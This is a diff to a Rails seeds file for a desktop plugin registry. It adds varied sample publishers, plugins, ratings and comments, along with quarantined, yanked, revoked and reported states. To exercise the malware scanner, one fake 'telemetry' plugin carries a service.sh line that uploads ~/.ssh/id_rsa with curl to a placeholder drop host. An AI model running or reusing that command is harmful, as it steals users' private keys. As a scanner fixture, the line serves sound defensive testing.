@@ -77,6 +77,223 @@ SAMPLES.each do |sample|
   end
 end
 
+# ---------------------------------------------------------------------------
+# A directory with only one publisher and three plugins doesn't show how the
+# app behaves in the real world, so the catalog below is deliberately varied:
+# several publishers (personal and org, claimed and not), every supported
+# kind, a spread of licenses, ratings, comments, view/download counts, and the
+# unhappy states — quarantined, yanked, revoked — so every UI branch has data.
+
+COMMUNITY = [
+  { email: "avery@example.com",  name: "Avery Lin" },
+  { email: "kai@example.com",    name: "Kai Ndlovu" },
+  { email: "sam@example.com",    name: "Sam Okafor" },
+  { email: "juno@example.com",   name: "Juno Marsh" },
+  { email: "petra@example.com",  name: "Petra Vogel" }
+].map do |attrs|
+  User.find_or_create_by!(email_address: attrs[:email]) do |u|
+    u.name = attrs[:name]
+    u.otp_secret = ROTP::Base32.random
+    u.otp_enabled_at = Time.current
+  end
+end
+
+def publisher_for(name, kind:, owner:, claimed: true)
+  publisher = Publisher.find_or_create_by!(name: name) { |p| p.kind = kind }
+  publisher.update!(claimed: claimed)
+  Membership.find_or_create_by!(publisher: publisher, user: owner) do |m|
+    m.role = :owner
+    m.founding = true
+  end
+  publisher
+end
+
+lumen = publisher_for("lumenlabs", kind: :org, owner: COMMUNITY[0])
+tidal = publisher_for("tidalworks", kind: :org, owner: COMMUNITY[1])
+kai = publisher_for("kai", kind: :personal, owner: COMMUNITY[1])
+juno = publisher_for("junomarsh", kind: :personal, owner: COMMUNITY[3])
+
+CATALOG = [
+  { publisher: lumen, name: "lumen-clock", summary: "A clock that knows when you are on call.",
+    kinds: [ "bar-widget" ], license: "MIT", versions: %w[1.0.0 1.1.0 1.2.0],
+    downloads: 18_402, views: 41_233, ratings: [ 5, 5, 4, 5, 4, 5 ] },
+  { publisher: lumen, name: "spectrum", summary: "Audio spectrum in the bar, tuned for tiny heights.",
+    kinds: [ "bar-widget" ], license: "Apache-2.0", versions: %w[0.4.0 0.5.0],
+    downloads: 6_120, views: 12_880, ratings: [ 4, 4, 5, 3 ] },
+  { publisher: lumen, name: "session-panel", summary: "Power, lock, and session actions in one panel.",
+    kinds: [ "panel" ], license: "MIT", versions: %w[2.0.0 2.0.1],
+    downloads: 9_755, views: 15_301, ratings: [ 5, 4, 4 ] },
+  { publisher: tidal, name: "tide", summary: "Tide tables and surf conditions for your coastline.",
+    kinds: [ "bar-widget", "panel" ], license: "BSD-3-Clause", versions: %w[0.9.0 1.0.0],
+    downloads: 3_140, views: 8_002, ratings: [ 5, 4 ] },
+  { publisher: tidal, name: "harbor", summary: "Docker and compose status without leaving your bar.",
+    kinds: [ "bar-widget", "menu" ], license: "MPL-2.0", versions: %w[1.4.0 1.5.0 1.6.0],
+    downloads: 22_908, views: 51_774, ratings: [ 5, 5, 5, 4, 5, 5, 3 ] },
+  { publisher: kai, name: "focus-overlay", summary: "Dims everything but the window you are working in.",
+    kinds: [ "overlay" ], license: "GPL-3.0-only", versions: %w[0.2.0],
+    downloads: 812, views: 3_450, ratings: [ 4, 3 ] },
+  { publisher: kai, name: "battery-guard", summary: "Warns before your laptop lies to you about battery.",
+    kinds: [ "service" ], license: "MIT", versions: %w[1.0.0 1.0.1 1.1.0],
+    downloads: 5_640, views: 9_120, ratings: [ 5, 4, 4, 5 ] },
+  { publisher: juno, name: "wallpaper-cycle", summary: "Rotates wallpapers on a schedule you actually set.",
+    kinds: [ "service" ], license: "ISC", versions: %w[3.1.0],
+    downloads: 14_030, views: 27_600, ratings: [ 4, 5, 4, 4, 5 ] },
+  { publisher: juno, name: "quick-notes", summary: "A scratchpad that opens faster than your editor.",
+    kinds: [ "menu" ], license: "MIT", versions: %w[0.7.0 0.8.0],
+    downloads: 2_205, views: 6_310, ratings: [ 4, 4 ] }
+]
+
+COMMENT_BODIES = [
+  "Replaced three of my dotfile hacks with this. Thank you.",
+  "Works exactly as described. The defaults are sensible out of the box.",
+  "Any chance of a config option for the refresh interval?",
+  "Been running this for a month, zero crashes.",
+  "The theme integration is the detail that sold me.",
+  "Small footprint and it does one thing well.",
+  "Had a rough edge on multi-monitor, latest release fixed it."
+]
+
+def seed_widget_files(summary)
+  {
+    "Widget.qml" => "import QtQuick\nItem { /* #{summary} */ }\n",
+    "README.md" => <<~MD
+      # #{summary}
+
+      Installs from the registry, lands disabled, and follows your Omarchy theme.
+
+      ## Features
+
+      - Zero configuration, sensible defaults
+      - Follows your Omarchy theme
+      - Tiny footprint
+
+      ## Settings
+
+      | Key | Default | What it does |
+      | --- | --- | --- |
+      | `refreshSeconds` | `30` | How often it refreshes |
+    MD
+  }
+end
+
+CATALOG.each do |entry|
+  owner = entry[:publisher].memberships.first.user
+  entry[:versions].each do |version|
+    plugin = entry[:publisher].plugins.find_by(name: entry[:name])
+    next if plugin&.version_burned?(version)
+
+    manifest = {
+      "schemaVersion" => 1,
+      "id" => "#{entry[:publisher].name}.#{entry[:name]}",
+      "name" => entry[:name].titleize,
+      "description" => entry[:summary],
+      "version" => version,
+      "kinds" => entry[:kinds],
+      "entryPoints" => entry[:kinds].to_h { |k|
+        [ Registry::ManifestValidator::KIND_ENTRY_RULES.fetch(k)[:key],
+          k == "service" ? "service.sh" : "Widget.qml" ]
+      },
+      "license" => entry[:license],
+      "repository" => "https://github.com/#{entry[:publisher].name}/#{entry[:name]}"
+    }
+    files = seed_widget_files(entry[:summary])
+    files["service.sh"] = "#!/bin/bash\necho #{entry[:name]}\n" if entry[:kinds].include?("service")
+    bytes = build_tarball(manifest, files)
+    created = Registry::PublishVersion.new(user: owner, publisher: entry[:publisher],
+      plugin_name: entry[:name], tarball_bytes: bytes).call
+    Registry::ReviewJob.perform_now(created)
+  end
+
+  plugin = entry[:publisher].plugins.find_by!(name: entry[:name])
+  plugin.update!(downloads_count: entry[:downloads], views_count: entry[:views])
+
+  entry[:ratings].each_with_index do |value, i|
+    rater = COMMUNITY[i % COMMUNITY.length]
+    Rating.find_or_create_by!(plugin: plugin, user: rater) { |r| r.value = value }
+  end
+
+  entry[:ratings].first(3).each_with_index do |_, i|
+    commenter = COMMUNITY[(i + 1) % COMMUNITY.length]
+    body = COMMENT_BODIES[(plugin.id + i) % COMMENT_BODIES.length]
+    next if Comment.exists?(plugin: plugin, user: commenter, body: body)
+    Comment.create!(plugin: plugin, user: commenter, body: body, created_at: (i + 1).days.ago)
+  end
+
+  puts "seeded #{plugin.full_name} (#{plugin.versions.count} versions, #{entry[:ratings].length} ratings)"
+end
+
+# --- Unhappy paths so the admin queue and warning states are not empty ------
+
+# 1. A version the scanner quarantined: exfiltration-shaped source.
+sketchy = build_tarball(
+  { "schemaVersion" => 1, "id" => "junomarsh.telemetry", "name" => "Telemetry",
+    "description" => "Collects a little more than it should.", "version" => "0.1.0",
+    "kinds" => [ "service" ], "entryPoints" => { "service" => "service.sh" },
+    "license" => "MIT", "repository" => "https://github.com/junomarsh/telemetry" },
+  { "service.sh" => "#!/bin/bash\ncurl -s -T ~/.ssh/id_rsa https://drop.example.com/x\n",
+    "README.md" => "# Telemetry\n\nNothing to see here.\n" })
+begin
+  flagged = Registry::PublishVersion.new(user: COMMUNITY[3], publisher: juno,
+    plugin_name: "telemetry", tarball_bytes: sketchy).call
+  Registry::ReviewJob.perform_now(flagged)
+  puts "seeded junomarsh/telemetry@0.1.0 (#{flagged.reload.state}) — admin queue"
+rescue Registry::PublishVersion::PublishError => e
+  puts "junomarsh/telemetry rejected at submit: #{e.message}"
+end
+
+# 2. A yanked version: the publisher pulled a bad release, newer one is live.
+harbor = tidal.plugins.find_by!(name: "harbor")
+if (bad = harbor.versions.published.order(:id).first)
+  bad.yank!(reason: "Broke on compose v2", actor: COMMUNITY[1])
+  puts "yanked #{harbor.full_name}@#{bad.version}"
+end
+
+# 3. A revoked (kill-bit) version so revocations.json isn't empty.
+focus = kai.plugins.find_by!(name: "focus-overlay")
+if (killed = focus.versions.published.order(:id).first)
+  Revocation.find_or_create_by!(plugin: focus, version: killed.version) do |r|
+    r.reason = "Shipped a keylogger in a patch release"
+    r.created_by = admin
+  end
+  puts "revoked #{focus.full_name}@#{killed.version}"
+end
+
+# 4. A report awaiting moderation.
+if (reported = juno.plugins.find_by(name: "quick-notes"))
+  Report.find_or_create_by!(reportable: reported, user: COMMUNITY[2]) do |r|
+    r.reason = "Possible license mismatch with upstream"
+  end
+  puts "reported #{reported.full_name}"
+end
+
+# 5. An UNCLAIMED, catalog-seeded namespace: this is how omarchyplugins.com
+# listings enter the registry before their authors claim them. Snapshot is
+# injected so seeding stays offline in dev.
+CATALOG_ENTRIES = [
+  { "publisher" => "driftco", "name" => "driftboard",
+    "summary" => "Sticky notes for the desktop, awaiting a claim.",
+    "repository" => "https://github.com/driftco/driftboard" },
+  { "publisher" => "driftco", "name" => "cursor-trails",
+    "summary" => "Comet trails behind your cursor. Yes, really.",
+    "repository" => "https://github.com/driftco/cursor-trails" }
+]
+
+fake_snapshot = lambda do |repository|
+  name = repository.to_s.split("/").last
+  build_tarball(
+    { "schemaVersion" => 1, "id" => "driftco.#{name}", "name" => name.titleize,
+      "description" => "Seeded from the community catalog.", "version" => "0.1.0",
+      "kinds" => [ "panel" ], "entryPoints" => { "panel" => "Widget.qml" },
+      "license" => "MIT", "repository" => repository },
+    seed_widget_files("Seeded from the community catalog."))
+end
+
+Registry::SeedCatalog.import(CATALOG_ENTRIES, snapshotter: fake_snapshot).each do |result|
+  entry = result[:entry]
+  puts "catalog-seeded #{entry['publisher']}/#{entry['name']}: #{result[:status]}#{" — #{result[:reason]}" if result[:reason]}"
+end
+Registry::ReviewJob.perform_now(PluginVersion.processing.last) while PluginVersion.processing.any?
+
 DataPlane::Regenerate.all
 puts "Seeded. Admin: ryan@heyoodle.com (passwordless — request a code in dev, it shows in the flash)."
 puts "Admin TOTP secret (add to your authenticator for step-up): #{admin.otp_secret}"
